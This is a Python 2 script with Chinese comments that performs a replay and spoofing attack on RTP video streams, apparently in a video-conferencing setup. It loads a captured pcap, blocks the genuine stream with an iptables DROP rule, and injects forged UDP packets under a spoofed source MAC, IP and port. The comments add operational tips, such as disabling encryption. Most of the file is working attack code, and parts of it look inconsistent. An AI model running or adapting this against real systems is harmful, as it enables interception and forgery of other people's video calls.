# -*- coding: utf-8 -*-
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#脚本by陈梦雅：进行视频码流的嗅探、拦截和伪造发送

#注意事项：
#测试前需要抓取网络包，然后过滤出需要伪造的视频码流，导出为pcap文件，并获取该条码流的源MAC、源IP、源发送端口及目的IP、目的发送端口；
#需要在if __name__=="__main__"下配置的变量名有：
#需要伪造的视频码流的源MAC地址S_MAC、源IP地址S_IP、源发送端口S_Port、目的IP地址D_IP、D_Port；伪造的码流从哪个网卡发出sendface；
#视频码流中一帧的结束在rtp头里的mark需要置为1，这里需要手动配置一帧结束的字段frame_end；
#如查看pcap文件mark=1时，字节为“e9”（十六进制），则frame_end=233（十进制）；
#本脚本主要是重放视频码流达到重放攻击的目的。
#测试时需要注意：过滤的数据包第一个为I帧；呼叫码率尽可能的低，建议512K左右；检查数据包里是否携带扩展信息；关闭加密设置等；

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
from winpcapy import WinPcapUtils
from winpcapy import WinPcapDevices
import winpcapy
from scapy.all import *
import struct
import os

#定义全局变量，并给全局变量赋初值；
global videodataframelist,videodatalist,timestamplist
videodatalist=[]
videodataframelist=[]
timestamplist=[]
global flag,data,framedata,flag2,flag3
flag=0
streamdata=0
framedata=0
flag2=0
flag3=0
global timestamp,mark,mark_mark

#监控码流并获取视频的载荷信息；
#确保过滤的视频数据包第一帧即为I帧 注意将SPS和PPS保留 否则解码端无法解码；
#实际测试中没有使用该函数，而是在开会之前手动抓包，再用wireshark过滤出pcap文件；
def packet_callback_cap(win_pcap, param, header, pkt_data):
    global flag
    global videodatalist, videodataframelist
    ip_frame = pkt_data[14:]    #ip_frmae里的元素是ip帧里的单个字节
        # Parse ip
    src_ip = ".".join([str(ord(b)) for b in ip_frame[12:16]])   #12到15字节是源IP
    src_port = int(ord(ip_frame[20])) * 16 * 16 + int(ord(ip_frame[21]))
    #dst_port = int(ord(ip_frame[22])) * 16 * 16 + int(ord(ip_frame[23]))
    if src_ip == "172.16.178.15" and src_port==60050:
        #seq = int(ord(ip_frame[30])) * 16 * 16 + int(ord(ip_frame[31]))
        if flag==1:
            timestamp_now=str(pkt_data[46:47])
            if timestamp==timestamp_now:
                videodataframelist.append(pkt_data[54:])
            else:
                timestamp=timestamp_now
                videodatalist.append(videodataframelist)
                videodataframelist=[]
                videodataframelist.append(pkt_data[54:])
            #print flag
        else:
            try:
                #print len(pkt_data)
                Slice_type=str(pkt_data[56])
                #Slice_type=struct.unpack('>B',Slice_type)
                #print Slice_type
                if Slice_type=='b\x27':
                    timestamp=str(pkt_data[46:47])
                    videodataframelist.append(pkt_data[54:])
                    #print flag
                    flag=1
            except:
                print "pass"

#获取嗅探的视频码流载荷；
#pcapfile：即提前抓取并过滤好的码流
def testmakedata(pcapfile):
    global flag3,mark,mark_mark,frame_end
    global videodatalist, videodataframelist
    pcaps = rdpcap(pcapfile)
    for p in pcaps:
        #print repr(p)
        raw= p["Raw"].load
        raw=str(raw)
        data=raw[12:]
        #print repr(data)
        if flag3==0:
            mark=raw[1]
            print repr(mark)
            timestamp_now=raw[4:8]
            timestamp=timestamp_now
            videodataframelist.append(data)
            flag3=1
        else:
            timestamp_now=raw[4:8]
            if timestamp==timestamp_now:
                videodataframelist.append(data)
            else:
                timestamp=timestamp_now
                videodatalist.append(videodataframelist)
                videodataframelist=[]
                videodataframelist.append(data)
            
    #修改mark
    mark_byte=bytearray(str(mark))
    mark_byte[0] = frame_end
    mark_mark=str(mark_byte)
    print repr(mark_mark)
    return (videodatalist,mark,mark_mark)


#回调函数，回调所有通过指定网卡的数据包，实时替换目标码流的载荷信息，实现视频的重放攻击；
def packet_callback_send(win_pcap, param, header, pkt_data):
    global S_MAC,S_IP,S_Port,D_IP,D_Port,sendface
    global streamdata,framedata,flag2, timestamp
    global videodatalist, mark, mark_mark, videodataframelist, timestamplist
    ip_frame = pkt_data[14:]    #ip_frmae里的元素是ip帧里的单个字节
    src_ip = ".".join([str(ord(b)) for b in ip_frame[12:16]])   #12到15字节是源IP
    src_port = int(ord(ip_frame[20])) * 16 * 16 + int(ord(ip_frame[21]))
    
    if src_ip == S_IP and src_port == S_Port:

        timestamp_send = pkt_data[46:50]

        #构造数据data，这个需要注意的是视频码流每一帧由很多包构成。
        #因此需要考虑同一帧视频的时间戳相同、最后一个包里面mark标志等；
        if flag2==0:

            timestamp=timestamp_send
            mark_send=mark
            datatouple=(pkt_data[42],mark_send,pkt_data[44:46],timestamp,pkt_data[50:54],videodatalist[streamdata][framedata])
            framedata=framedata+1
            flag2=1

        else:
            if streamdata > (len(videodatalist)-1):
                streamdata=0
                framedata=0
            if framedata > (len(videodatalist[streamdata])-1):
                framedata=0
                streamdata=streamdata+1
                timestamp=timestamplist[0]
                timestamplist.pop(0)
            if not timestamp==timestamp_send:
                timestamplist.append(timestamp_send)
            if (framedata-(len(videodatalist[streamdata])-1))==0:
                mark_send= mark_mark
            else:
                mark_send=mark

            datatouple=(pkt_data[42],mark_send,pkt_data[44:46],timestamp,pkt_data[50:54],videodatalist[streamdata][framedata])
            framedata=framedata+1
        
        #发送伪造后的数据数据
        makedata=''.join(datatouple)
        sendp(Ether(src=S_MAC)/IP(src=S_IP,dst=D_IP)/UDP(sport=S_Port,dport=D_Port)/makedata,iface=sendface)
        
if  __name__=="__main__":
    #码流信息配置
    global S_MAC,S_IP,S_Port,D_IP,D_Port,sendface,frame_end
    S_MAC='ec:d6:8a:1e:7f:67'
    S_IP='172.16.176.123'
    S_Port=27997
    D_IP="172.16.178.251"
    D_Port=60068
    sendface='eth1' #伪造的音频码流从哪个网卡发出去，'eth0'或'eth1'
    frame_end=233

    (videodatalist,mark,mark_mark) = testmakedata('AES.pcap')
    command="iptables -t filter -A FORWARD -s " + S_IP + " -p UDP --sport=" + str(S_Port) + " -j DROP"
    os.system(command)
    WinPcapUtils.capture_on_device_name('br0', packet_callback_send,0)


